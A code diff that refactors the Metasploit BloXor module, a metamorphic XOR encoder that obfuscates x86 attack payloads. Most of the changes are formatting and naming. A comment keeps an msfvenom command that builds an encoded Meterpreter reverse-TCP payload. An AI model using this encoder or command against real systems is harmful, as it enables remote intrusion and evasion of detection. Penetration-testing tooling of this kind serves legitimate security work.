@@ -1,11 +1,8 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-#   http://metasploit.com/framework/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rex/encoder/bloxor/bloxor'
 
 #
@@ -26,28 +23,27 @@ require 'rex/encoder/bloxor/bloxor'
 # >ruby msfvenom -p windows/meterpreter/reverse_tcp RHOST=192.168.2.2 LHOST=192.168.2.1 LPORT=80 -a x86 -e x86/bloxor -b '\x00' -f raw | ndisasm -b32 -k 128,1 -
 #
 
-class Metasploit3 < Rex::Encoder::BloXor
+class MetasploitModule < Rex::Encoder::BloXor
 
-	# Note: Currently set to manual, bump it up to automatically get selected by the framework.
-	# Note: BloXor by design is slow due to its exhaustive search for a solution.
-	Rank = ManualRanking
+  # Note: Currently set to manual, bump it up to automatically get selected by the framework.
+  # Note: BloXor by design is slow due to its exhaustive search for a solution.
+  Rank = ManualRanking
 
-	def initialize
-		super(
-			'Name'        => 'BloXor - A Metamorphic Block Based XOR Encoder',
-			'Description' => 'A Metamorphic Block Based XOR Encoder.',
-			'Author'      => [ 'sf' ],
-			'Arch'        => ARCH_X86,
-			'License'     => MSF_LICENSE,
-			'EncoderType' => Msf::Encoder::Type::Unspecified
-			)
-	end
+  def initialize
+    super(
+      'Name'        => 'BloXor - A Metamorphic Block Based XOR Encoder',
+      'Description' => 'A Metamorphic Block Based XOR Encoder.',
+      'Author'      => [ 'sf' ],
+      'Arch'        => ARCH_X86,
+      'License'     => MSF_LICENSE,
+      'EncoderType' => Msf::Encoder::Type::Unspecified
+      )
+  end
 
-	def compute_decoder( state )
+  def compute_decoder( state )
 
-		@machine = Rex::Poly::MachineX86.new( state.badchars )
+    @machine = Rex::Poly::MachineX86.new( state.badchars )
 
-		super( state )
-	end
-
+    super( state )
+  end
 end
